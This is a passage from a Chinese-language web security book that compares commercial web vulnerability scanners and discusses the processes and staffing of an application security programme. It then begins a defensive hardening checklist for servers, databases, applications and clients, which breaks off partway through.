SecurityChecker 2.0 的开发环境 QA 组件只集中在.NET 应用程序上，它作为 Visual Studio 2003 和 2005 的插件运行。当你希望分析一个应用程序安全缺陷的影响时，首先在 Visual Studio 中打开一个工程，然后从中启动 SecurityChecker。

在提供了一些不太重要的配置之后（比如已发布的 Web 应用程序将运行的路径），SecurityChecker 将接管并进行完全自动的分析。我们从 SecurityChecker 中得到的结果非常有趣，它有时提供其他工具所没有的结果。

SecurityChecker 提供的一个独特结果是应用程序的权限级别。在将我们的测试应用程序转换为.NET 2.0 的过程中，我们遇到了一些和权限有关的错误。由于面临着发布期限，我们以经典的“尽快出货”（Get it out the door）的软件开发风格，给运行应用程序的账号赋予了额外的权限。SecurityChecker 捕捉到了该问题，并提供了一份对额外权限相当详细的分析，而在某些情况下，SecurityChecker 还会分析攻陷应用程序的攻击者利用该权限可以做的事情。该输出如图 13-10 所示。

 </div>

我们发现 DevPartner Security Checker 的源代码分析功能很有限。虽然一些更高级的商业源码分析器尝试遍历代码路径并对迭代函数进行深入的分析，但是看起来，SecurityChecker 提供的信息不过是静态特征匹配和“危险方法”标记。当对我们的基于 Flash 的测试应用程序（我们测试中唯一的 .NET 应用程序）源代码进行分析时，唯一的发现是识别出 PageValidators 被禁用了。它也不能识别出嵌入到我们测试应用中的 XSS 漏洞。

现在进入重点了：自动扫描。让人振奋的是，DevPartner Security Checker 的运行与我们测试的其他扫描器很类似。但和预期的一样，与单纯的扫描器相比，它在一些地方还不成熟。事实上，Security Checker 是唯一尝试注入任意参数，并且如果返回的 URL 字符串中存在同样的参数时会标记出问题的工具。只要他们再更进一步，尝试在这些参数中注入 XSS 攻击，就可以获得该项测试的金牌。

我们对 SecurityChecker 感到失望的是它没有提供任何“深入底层”的方法——我们无法为源代码扫描器或 Web 应用扫描器添加定制的检查。如前面所演示的，如果不能定制检查或者方便地进行手动分析，即使在面临中等规模和复杂度的应用程序时，任何自动化工具的作用都会被明显地削弱。

不过我们相信如果 Compuware 保持对该领域的投入，SecurityChecker 还是有很大的潜力。

#### 13.1.4 整体测试结果

现在告诉你们所等待的结果：谁是最好的？

虽然我们进行了大量的测试，在实验室中对每种工具花费了大量的时间，而且和它们的产品开发小组多次深夜电话交流，但是我们还是谨慎地对 Web 应用安全扫描器进行整体优胜排名。显然，在一个大中型企业中，决定购买某个工具来进行配置会基于很多因素，远不止我们在测试中所使用的那些。不过，我们认为基于我们的经验可以做一些推荐。最成熟的工具是 Watchfire，SPI 和 Cenzic。我们基于检查质量、定制能力和易用性，艰难地选出这三个工具。排名随后的是 Syhunt 和 Acunetix，它们在特定的任务中非常出色，也展现了一些创新的功能，只是在整体上没有前三种工具那么完善。最后，Ecyware 在手工测试中非常出色，但自动化功能与整体情况相比还有些不足。我们希望以上评论能在你开始采购扫描器程序时，给你一个指导方向。

我们在这里列出了一些在测试中观察到的问题，这可能比我们对工具完全主观的排名更有趣：

- 最大的失望之处是，没有扫描器能可靠地探测出我们测试应用中的复活节彩蛋——盲SQL注入，更糟糕的是，扫描器的市场宣传声称它们可以探测出这类问题，让我们

误认为应用程序没有这类漏洞。

对于大部分工具，定制功能还严重不足，这阻碍了我们“深入底层”来设计我们定制的检查。定制检查对扫描 Web 应用是非常必要的，因为 Web 应用通常会偏离模板化的测试。在这里，Cenzic Hailstorm 是个值得注意的例外，它提供了很好的定制功能。

Hailstorm 是唯一可以作为单独的预定任务来执行授权和非授权两种测试的工具。

差异分析功能比较弱——我们不得不编写定制的测试来验证 Rob 能否访问 Sally 的报告。

只有一个扫描器可以发现我们的“复杂”的 XSS 漏洞，该漏洞在一个现成的 Web 应用软件包里。

- 只有两个扫描器（SPI 和 Watchfire）能可靠地探测出来自 RSnake Web 站点使用替代标记的 XSS 漏洞。

☐ 没有扫描器可以探测出使用双编码载荷的 XSS 漏洞。

- 尽管多个厂商在它们的市场宣传中列出了 Flash 审计功能，但只有一个真正地发现了我们的例样 SWF 文件。

虽然大多数扫描器可以在技术上说它们覆盖了 OWASP Top10 漏洞，但是我们发现各个工具对每种 OWASP 分类的检查深度非常不平衡。

只有一个工具执行了 Web 应用日志安全分析。

我们希望扫描器厂商在将来的版本中解决这些问题。举个例子，在最初的测试阶段之后，我们和很多厂商讨论了关于 XSS 检测的问题，随后，一些厂商发布了他们产品的更新，或者派产品开发人员和我们积极地交互，以解决这些问题。

接下来，我们将更详细讨论其中的一些主题，以及我们认识到的其他主题。

##### 手动 vs 自动功能

我们在商业扫描器的手动测试组件中，发现了比想象中更多的 bug，甚至在默认状态代码特征库中，都发现了 bug。这支持了我们的假设，即拥有自动化扫描器的人，很少会去使用手动测试插件。而那些少数会使用它们的人，又很可能能够识别和更改默认的缺陷，没有时间等待厂商的支持和修复。

##### 速度 vs 深度

我们怀疑对攻击的深度测试在很多工具中都没有完整的实现，这源于一个事实：Web应用漏洞扫描器的潜在客户仍基于“速度”来评估扫描器。这在很大程度上是一个武断的标准，因为测试更加复杂的问题需要扫描器对应用程序发出更多的请求。带有最彻底的 XSS

测试引擎的扫描器，也很有可能在基于速度的评测中失败，因为正确地识别出 XSS 攻击漏洞需要大量的测试。一个厂商的工具即使其 XSS 检查受限或不充分，却可能因为执行的任务很少而相对“更快”。这种基于速度评估扫描器的做法令人失望，我们希望对它进行一些修正，适当关注一下分析的质量。

##### 虚警

虚警是安全漏洞扫描器的硬伤，我们一直都忽视这个问题，这并不意味着我们在测试中没有多次遇到过。举个例子，在我们对工具的初步评估中，我们发现某个产品在处理一个特殊 HTTP 状态码中有一个缺陷，会导致相当多的 XSS 虚警。该扫描器解析所有 HTTP 302 重定向的响应体，并将 302 中的所有数据都标记为一个有效的利用（exploit）。虽然通过 HTTP 302 重定向泄漏的信息很值得分析，而且不止一个工具将其识别为潜在的信息泄漏问题，但是 Web 浏览器不会执行一个 302 重定向体中的任何代码。事实上，只有非常早的第一代 Web 浏览器像 Lynx，会显示一个 302 的体，而这类浏览器不能执行脚本体。

希望这可以提醒大家，这些工具无论配置在什么环境中，都需要调校。

##### 报告

在这里，我们衡量的主要标准是每个工具所提供的基础分析，包括扫描中的趋势、每个被识别出的攻击的详细技术信息、给IT管理员和开发者的防范信息，并使用广泛接受的术语，如OWASP Top 10或WASC攻击分类方式来编写报告。

我们所评审的大部分工具，即使不是全部，也是符合一些标准。很多工具带有一个全功能的报告数据库，可以跨多个测试产生趋势报告；提供针对开发者的信息（虽然这种信息常常是有限的或特定语言的）；一些工具还利用一种普遍接受的分类系统。

##### 黑盒扫描 vs 白盒分析

什么时候使用第 12 章中讨论的那些白盒方法来寻找漏洞会更加高效呢？我们的测试说明，最好是在把精力集中在开发流程上，以发现和修补一些典型的漏洞。

XSS 参见我们 XSS 测试的例子，通过检查源代码可以非常清楚地了解应用程序做了些什么，也可以编写一组签名，来阻止向页面写入可能是由用户提供的变量的数据。但是，这会产生需要克服的大量不安全噪声，而且也不能说明哪一段输出到页面的数据已经通过了严格的输入验证。

然而，扫描源代码可以保证所有的输出都经过正确的编码，几乎可以阻止所有类型的XSS攻击。考虑到大部分应用程序都只有有限的几处会将用户提供的或不可信的数据输出到页面中，我们认为能满足我们前述的商业目的的唯一彻底的方法，是把手动渗透测试和源代码分析结合起来。

SQL 注入 虽然我们使用自动化 Web 应用扫描探测盲 SQL 注入完全失败了，但是我们能通过查看屏幕背后的查询语句，立即识别出潜在的滥用问题。显然，识别该问题的最有效方法是检查源代码。我们能否自动化地高效分析该问题，仍然还需要观察。一些自动化源码分析器，可以识别页面中，甚至存储过程中的动态 SQL 查询，但是我们还没有见过能从数据库的一个表中提取出触发器，并对它们进行分析的工具。

##### IDS 超载

我们认为应该分享一下在我们测试经历中的奇闻轶事，以此作为我们测试笔记的结束。

深入到我们的测试机制中，我们无意地对我们的安全分析成果进行了一次拒绝服务攻击。为了记录扫描器抛出的所有攻击类型，我们在一个测试应用程序上实现了一个 PHP 模块，把它设计成一个入侵检查系统（IDS）：转储所有的系统状态和可疑字符串内容，并通过电子邮件发送到邮件服务器上专为监测而建立的一个账号上。

遗憾的是，在 IDS 模块产生的消息负载下，我们的 E-mail 客户端 Outlook 2003 不能很好的工作。单是在 5 天的系列测试中，每天产生了超过了 1 GB 的 HTTP 请求，生成了超过 2 GB 的 IDS 电子邮件警告（很大程度上是由于在 IDS 警告中记录了详细的信息）。

当遇到复杂的 JavaScript 或者响应自定义错误页面（比如，HTTP 200 OK）的子目录时，一些扫描器倾向于进入无限的循环，这使上面所说的问题更加恶化。还有一些扫描器盲目地给每一个可用的表单和可枚举的变量提交大量的与语言或页面本质无关的测试。

更糟糕的是，我们不能通过 POP3 或基于 Windows 的 IMAP E-mail 客户端下载和删除·大量邮件——即使是服务器端基于 Web 的邮件客户端，都不能再登录了。最后，我们不得不登录到一个命令行 Shell，手动删除邮件池的文件。

对我们的教训（以及阅读本章的所有人）是：记着在攻击你自己之前调校你的 IDS，因为真正的攻击很容易被掩盖在测试所产生的大量无效数据之下。

### 13.2 非技术问题

既然我们已经深入地阐述了可用的 Web 应用安全扫描技术，那么在一个典型的企业环境中，人员和流程在成功地配置这些工具所作的贡献中，扮演了什么角色呢？

#### 13.2.1 流程

任何自动化安全评估方法从本质上来讲都是一种流程，因此细致的流程设计是取得长期成功的关键。在本节中，我们将列出设计一个健全的“安全工作流程”的一些关键步骤。

在 IT 产业中的多次经历使我们认识到，首先要避免的事情是 “一切从头开始”（build from scratch）综合症。在任何有竞争力的大中型企业的 IT 产品中，几乎肯定已经存在一些支持框架了。我们对那些希望构建自动化 Web 安全评估程序的人的主要建议是：充分利用那些已有的产品！

这需要预先细致地调查研究。了解你当前公司的应用程序质量保证（Quality Assurance，QA）流程是如何工作的，以及最高效的集成点在哪里（更多的细节参见第12章）。与把自动化扫描器集成到实时应用产品支持流程同样重要的是，你需要了解当前的操作支持框架是如何工作的，从数据中心物理接触服务器的合同工，到工作在印度电话银行的第1层的支持合同工，再到第2层和第3层的系统工程师员工，直到必要时会最终收到改进意见的“第4层”开发团队人员（以及他们的管理者！）。你必须仔细地考虑如何把你的评估方法和工具集集成到已有的层次中，以及你需要在什么地方对已存在的流程做一些重大改动。

在我们的经验中，需要考虑的重要问题包括：

○ 管理层的了解和支持 高管们需要了解自动化评估流程与整个商业风险管理程序的关系，并从各个方面给予支持（并不需要密切地了解执行的细节）。

角色和责任 管理层也应该清楚地了解公司对评估程序没有阐述到的问题所负有的责任。从第 X 层操作员工到某个应用程序的最高级别的管理负责人，都遵循之前提出的责任模型是非常明智的办法。

安全策略 安全策略应该制定得尽量简洁，在组织内部得到广泛的了解，并且在实际中可行。至少，它应该描述计算标准、违反策略的危险级别，以及预期的补救流程。安全策略也应该考虑相关的诸如支付卡行业数据安全标准（Payment Card Industry Data Security Standard，PCI DSS）的规章制度标准。如果还没有一个很好的策略，你就要撰写一个！

- 与已存在的软件开发生命周期（SDLC）相集成 应该有一个描述非常清晰的途径，将适当类型和危险级别的 bug 从 Web 安全扫描报警器送到开发者的桌面。你也应该考虑在 SDLC 的不同节点上进行扫描的可行性（比如，预研产品 vs 正式产品）。

- IT 问题提交系统 如果你选择的自动化工具没有很好地集成，那么你的项目还没开始就已经夭折了。千万不要计划实现你自己的“安全”问题提交系统——你会后悔莫及的，因为你发现可能需要找和第1层的支持人员同等数量的人来处理大量警告。在配置产品前进行充分地测试和调校。

○ 事件响应流程 如果还没有一个良好的公司事件响应流程，你需要催促执行高管尽

快展开这方面的工作。否则，当警告超出现有的流程处理能力时，安全小组看起来就像傻子一样束手无策。

事后分析 我们看到很多公司都没有从事件和失败流程中吸取教训；确保你的整个计划中包含完善的事后分析流程。

流程文件 在我们的经验中，外部审计最常见的是缺乏流程文件（我们对此有切肤之痛！）。不要目光短浅地放任自流——如果还没有一个标准的操作手册，那么分配恰当的资源为公司创建一个。

培训如同把“secure coding”一书放到软件开发者的书架上并不会开启安全的SDLC一样，在某个系统工程师的桌面上安装最新的应用安全扫描器也是完全没有作用的。确保对所有级别的用户不断地提供培训，教会他们如何使用系统；记录下参加者，测试他们的理解程度，并且指派专职经理负责这个事情。

显然，这个过是对相当复杂的主题进行的简要概述。我们希望这会是你深入研究这些领域的向导。

#### 技术评估和获取

一旦了解了情况，一个初始安全扫描程序首先面临的问题是“编写还是购买？”总的来说，我们建议“购买”，基于我们一般的经验，从长期来说，为开发内部的安全应用投入资金是不值得的（我们也曾经在一些很大的、先进的软件开发公司中工作，该建议对他们来说仍是正确的）。这意味着你需要设计一个流程，不断地评估新技术，以保证你的扫描程序能一直正常运行。

我们建议你明确投入的人力，定义出清晰的目标，这样不会成为“天蓝色天空”（blue sky）或者变成摇摇晃晃的“臭鼬小组”（skunk works）项目，并保证你已经分配了恰当的预算来执行小组所做的技术选择。在本章前面的评测讨论中，已经提到了如何为评估 Web 应用安全扫描器而开发技术标准。超过这些内容之外的一般评估技术和获取流程不在本书讨论的范围。

#### 13.2.2 人员

一旦定义好了流程，以人尽其能的方式把人员放入到流程之中是非常重要的。要做到“人尽其能”，需要兴趣、技巧和角色间的精妙平衡。对于无形的兴趣我们帮不了你，但下面这些可以帮助你指导其他职员做正确的事情。

#### 必备的技能

一个成功的应用安全自动化程序需要进行复杂的分析，企业通常都会低估这一点，并

且常常很难在团队中找到符合该角色的人选。在我们看来，这个人应该具有以下重要品质：

- 充满热情，对软件常见安全问题和防范措施在技术有深刻理解，并且做过相关的工作。

- 较深层次地理解操作系统的一般安全概念（比如，TCP/IP 安全、防火墙、IDS、安全补丁管理等等）。

☐ 软件开发经验（理解商业需求、用例方案、功能规范以及代码开发本身）。

高超的项目管理技巧，特别是同时处理跨多个活动项目的能力。

☐ 从技术上了解整个公司基础设施和应用程序。

- 能用商业术语对技术风险划分优先级，并清晰地描述技术风险，不会由于自动化应用评估工具产生的避免不了的干扰而增加虚警。

显然，寻找同时具备这些技能的人才是一种挑战。不要期望一夜之间就能雇到一打这样的人——在评估你的员工时谨慎一些，尝试将流程的整个目标与他们联系起来。

在我们的经验中，寻找这样的复合型人才事实上不大可能，大多数招聘经理不得不妥协。我们建议寻找的潜在雇员应该拥有软件开发和安全背景两方面的知识，而不是只拥有纯粹的安全操作背景。我们发现，给有经验的软件开发人员讲授安全，比给安全操作专家讲授软件开发要更加容易。另一种两全其美的简单方法是，为框架/操作安全和应用安全建立不同的团队。这也为员工提供了可行的职位发展规划，从基本的问题响应开始，逐步成长为与应用开发团队进行战略上的交流共同解决难题的专业人士。

##### 公司的结构和角色

就像我们先前提到的，经验说明，执行一个自动化应用评估程序的最高效方法就是将其紧密地集成在已有的 QA 开发和操作支持流程中。这里所面临的挑战是要调整不同团队的目标，这些团队可能来自公司的不同部门：IT 操作，安全/风险管理、内部审计和软件开发（其自身可能会被划分成不同的业务单元）。

我们的经验告诉我们，在狐狸和鸡之间创建的隔离越宽（这是一个比喻），那么就越不容易发生骚乱。实际上，这意味着把安全评估从应用开发和操作执行中分离出来。

另外，我们看到一些公司的结构，是把安全责任放在软件 QA 团队，或者放在 IT 操作团队中。绝大多数情况下，我们不推荐这样做，因为发布产品和发布安全的产品的本来就有潜在的矛盾（就像让狐狸守卫鸡圈一样）。我们一次次的看见，提供外部检查和平衡软件开发/支持流程是多么的重要（在考虑安全前就设置发布产品的最后期限，而流程经常在这种不切实际的期限下执行）。

为了避免由于给软件开发团队设置额外的要求而疏离他们，我们再一次强烈地建议储备有软件开发背景的安全人员。这对避免开发流程中的“规避安全”文化大有帮助。

### 13.3 小结

虽然手动分析在 Web 应用安全测试中的大多数方面表现得更加出色，并且手动分析仍是测试不可替代的一部分，但是自动化技术也在不断地完善，Web 应用安全扫描器市场比以前更加活跃。我们相信，就像拼写检查一样，安全自动化的好处会不证自明。

### 13.4 参考和进一步阅读

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Acunetix 公司 Web 漏洞扫描器</td><td style='text-align: center; word-wrap: break-word;'>http://www.acunetix.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Cenzic Hailstorm</td><td style='text-align: center; word-wrap: break-word;'>http://www.cenzic.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ecyware GreenBlue Inspector</td><td style='text-align: center; word-wrap: break-word;'>http://www.ecyware.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Syhunt Sandcat Suite</td><td style='text-align: center; word-wrap: break-word;'>http://www.syhunt.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SPI Dynamics WebInspect</td><td style='text-align: center; word-wrap: break-word;'>http://www.spidynamics.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Watchfire AppScan</td><td style='text-align: center; word-wrap: break-word;'>http://www.watchfire.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>NTObjectives NTOSpider</td><td style='text-align: center; word-wrap: break-word;'>http://www.ntobjectives.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Compuware DevPartner SecurityChecker</td><td style='text-align: center; word-wrap: break-word;'>http://www.compuware.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WhiteHat Security</td><td style='text-align: center; word-wrap: break-word;'>http://www.whitehatsec.com</td></tr></table>

## 附录 A Web 应用程序的安全检查列表

该检查列表总结了本书中的建议和对抗措施。虽然我们在此不再重述列表中每个项目的所有细节，但是我们希望在设计和操作 Web 应用程序时，通过核实这个列表中的条目能发现是否实施了应采用的最佳安全措施。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>是否核实</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>网络</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>已安装边界防火墙、筛选路由器或者其他建立在 Web 应用和不可信网络之间的过滤设备</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>防火墙/路由器已配置成只允许入方向上所必须的流量到达 Web 应用（一般是只允许 HTTP 和/或 SSL）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>防火墙/路由器已配置成只允许 Web 应用出方向上必须的流量通过（一般通过丢弃 TCP SYN 包防止服务器</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>初始化一个出方向的连接）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在防火墙/网关上已正确地启用了 DoS 对抗措施（比如，Cisco “rate limit” 命令）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>已配置负载均衡器，避免泄漏有关内部网络的信息</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>可以配置一个网络入侵检测系统（Network Intrusion Detection System，NIDS）以检测一般的 TCP/IP 攻击；</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>如果配置了 NIDS，应该准备好合适的日志检查策略和资源</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>规律性地进行网络漏洞扫描，确保没有网络层或系统层的漏洞</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Web 服务器</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>已经安装厂商提供的最新软件补丁</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>配置服务器，使其不得泄漏关于服务器软件的信息（比如，改变 banner 信息）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>配置服务器，不允许目录列举和访问上级路径</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>服务器配置成不允许反向代理</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在所有服务器上禁用不必要的网络服务</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在恰当的地方执行操作系统和厂商提供的服务器安全配置</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>禁用和删除不需要的用户和用户组（例如，Guest 来宾账号）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>启用操作系统审计，Web 服务器以 W3C 格式进行记录</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在所有服务器上禁用不需要的 HTTP 模块或扩展（比如，删除不用的 IIS ISAPIDLL 映射，卸载 Apache 模块）</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>是否核实</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>删除所有服务器上的 Web 内容/应用例子</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>为相关目录配置相应的认证机制</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>使用安全套接字层（Secure Sockets Layer，SSL）保护易受到窃听的数据流（例如 HTTP 的基础认证），要求 128 位的加密，对敏感信息的传输不允许降低输出加密等级</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>把含有 Web 内容的虚拟根目录，配置在一个单独的、专用的磁盘驱动器/卷标上（没有管理员工具的盘）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>禁用目录列举和禁止访问上级路径</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>应该用低权限的账号运行 HTTP 服务</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>为 Web 目录和文件设置正确的访问控制列表</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>如果不使用 WebDAV 功能，应该将其禁用或删除；否则，应该严格限制 WebDAV 的使用</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>关闭 Web Publisher 功能（针对 Netscape/iPlanet 产品）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在恰当的位置配置 Web 服务器安全模块（比如，IIS URLScan 或 Apache ModSecurity）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>使用漏洞扫描器来扫描服务器的远程可利用的漏洞；处理发现的问题</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>可以配置一个主机入侵检测系统（Host Intrusion Detection System，HIDS）以检测通用的应用程序；如果</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>配置了 HIDS，应该准备好正确的日志检查策略和资源</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>数据库服务器</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>数据库软件以最低权限运行（比如，Microsoft SQL 服务器的上下文是一个低权限的本地或域账号）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>数据库软件已升级到厂商提供的补丁的最新版本</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>从服务器上删除示例账户和数据库</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>启用正确的 IP 包过滤以限制 Web 服务器和数据库服务器之间的流量（比如，路由器或 Windows 2000 及</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>以上版本的 IPSec 过滤器）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在 Web 服务器和数据库之间配置正确的认证（比如，对于 Microsoft 服务器使用集成认证）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>修改数据库用户账号的默认密码（不要对系统管理员 sa 账号设置成空口令！）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>合理地限制数据库用户的权限（查询不要简单的以 sa 执行）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>如果不需要，从数据库软件中删除扩展存储过程，从硬盘上删除相关的库</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>不要在应用程序代码中嵌入数据库用户密码</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>应用程序</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>已将威胁模型文档化，并且请恰当的团队核准</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>完成了恰当的安全开发生命周期里程碑</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>将开发/QA/测试/临时环境与产品环境在物理上隔离，不要复制产品数据到 QA/测试/临时环境中</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用最安全的方式实行了正确完善的认证（比如，利用 HTTPS，密码以散列存储，密码自支持功能最佳措施</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>等）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>为应用程序目录和文件设置了正确的 ACL</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>是否核实</td></tr><tr><td colspan="2">在服务器端实行了恰当的输入验证和/或输出编码</td></tr><tr><td colspan="2">要清除应用程序脚本的源代码，包括文件等中的秘密数据、私人数据和机密信息</td></tr><tr><td colspan="2">从服务器上删除临时文件和常见文件（比如，.bak 文件）</td></tr><tr><td colspan="2">正确执行授权/会话管理（极力推荐使用平台提供的功能，比如 ASPSESSIONID 或 JSESSIONID，ASP.NET IsInRole 等等）</td></tr><tr><td colspan="2">总是执行明确的访问控制——不要只是因为用户不知道链接或无法篡改 HTTP 请求，就假设用户不能访问某些内容</td></tr><tr><td colspan="2">总是在登录之后赋予一个新的会话 ID，总是拥有注销功能，并且不允许多个会话同时存在</td></tr><tr><td colspan="2">使用最低权限建立应用程序用户角色</td></tr><tr><td colspan="2">使用与任务适应的成熟的算法来进行加密</td></tr><tr><td colspan="2">包含文件应该放在虚拟根目录之外，并使用正确的 ACL</td></tr><tr><td colspan="2">在 Microsoft IIS 服务器上，包含文件应改名为.asp</td></tr><tr><td colspan="2">如果可能，识别并避免危险的 API/函数调用（比如，IIS 上的 RevertToSelf）</td></tr><tr><td colspan="2">进行参数化的 SQL 查询</td></tr><tr><td colspan="2">在 .NET 框架上，检查违反 .NET 框架安全（COM Interop，P/Invoke，Assert）的调用</td></tr><tr><td colspan="2">启用了恰当的错误处理和安全日志</td></tr><tr><td colspan="2">执行了严格的源代码安全审计</td></tr><tr><td colspan="2">执行了远程“黑盒”恶意输入测试</td></tr><tr><td colspan="2">如果必要，聘请第三方进行渗透测试</td></tr><tr><td colspan="2">定期进行应用程序漏洞扫描，以减少应用层的漏洞</td></tr><tr><td colspan="2">客户端</td></tr><tr><td colspan="2">注意：本节检查列表与前面的部分不同，前面的部分是从 Web 应用管理员或开发者的角度设立的条目，而本节是从终端用户的角度出发。但是，管理员和开发者应该注意，设计和实现他们的应用程序时，应该满足这些需求。</td></tr><tr><td colspan="2">在入方向和出方向上都启用个人防火墙，并只允许尽量少的应用程序通过</td></tr><tr><td colspan="2">以最低权限运行 Web 应用程序，不要以管理员（或相等的高权限账号）登录到将用来浏览因特网或阅读邮件的系统上</td></tr><tr><td colspan="2">所有的客户端软件都升级完所有最新软件相关的安全补丁（启用自动化升级选项）</td></tr><tr><td colspan="2">安装杀毒软件并配置实时扫描（特别是扫描收到的邮件附件），并启用杀毒软件的自动更新功能</td></tr><tr><td colspan="2">除杀毒软件外，还安装了反广告反间谍，反钓鱼软件（假设杀毒软件还不具备这些功能）</td></tr><tr><td colspan="2">谨慎地配置因特网客户端安全，比如，像第 11 章中描述的那样配置 Windows “因特网选项”控制面板（也可以通过 IE 和 Outlook/OE 访问）。</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>是否核实</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>如果单独配置，保证其他客户端软件（特别是 E-mail！）使用最保守的安全设置（比如，在 Microsoft E-mail 客户端中设置受限制的站点区域）</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>尽可能安全地配置 Office 产品，比如，在“工具”|“宏”|“安全”下设置微软 Office 的宏安全为“非常高”</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在浏览器内或者通过第三方工具诸如 CookiePal 